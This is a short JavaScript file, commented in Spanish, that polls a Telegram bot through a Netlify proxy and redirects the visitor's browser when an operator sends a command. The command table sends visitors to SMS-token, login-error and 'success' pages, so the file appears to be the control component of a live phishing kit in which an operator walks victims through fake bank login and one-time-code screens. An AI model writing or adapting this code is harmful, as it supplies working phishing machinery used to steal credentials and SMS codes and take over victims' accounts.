// Todas las llamadas a Telegram pasan por aquí.
// El token NUNCA llega al navegador — vive en las variables de entorno de Netlify.

const PROXY = "/api/telegram";

async function tg(action, payload = {}) {
  try {
    const res = await fetch(PROXY, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ action, payload })
    });
    return await res.json();
  } catch (e) {
    console.error("Error proxy Telegram:", e);
    return null;
  }
}

// Obtiene el último update_id de Telegram para ignorar mensajes viejos
async function getLastUpdateId() {
  try {
    const data = await tg("poll", { offset: -1 });
    if (data && data.ok && data.result.length > 0) {
      return data.result[data.result.length - 1].update_id;
    }
  } catch(e) {}
  return 0;
}

// Polling: llama al proxy para obtener updates de Telegram
async function pollTelegram(lastId, onAction) {
  let running = true;

  const COMANDOS = {
    ir_token_sms : "token_sms.html",
    ir_ami_ven   : "ami_ven.html",
    error_login  : "index.html?error=login",
    error_token  : "token_sms.html?error=1",
    error_ami    : "ami_ven.html?error=1",
    finalizar    : "exito.html"
  };

  while (running) {
    const data = await tg("poll", { offset: lastId + 1 });

    if (data && data.ok && data.result.length > 0) {
      for (const update of data.result) {
        lastId = update.update_id;

        let accion = null;
        if (update.callback_query) {
          accion = update.callback_query.data;
        } else if (update.message && update.message.text) {
          accion = update.message.text.replace("/", "").trim().toLowerCase();
        }

        if (accion && COMANDOS[accion]) {
          running = false;
          if (typeof onAction === "function") onAction();
          window.location.href = COMANDOS[accion];
          return;
        }
      }
    }

    await new Promise(r => setTimeout(r, 3000));
  }
}
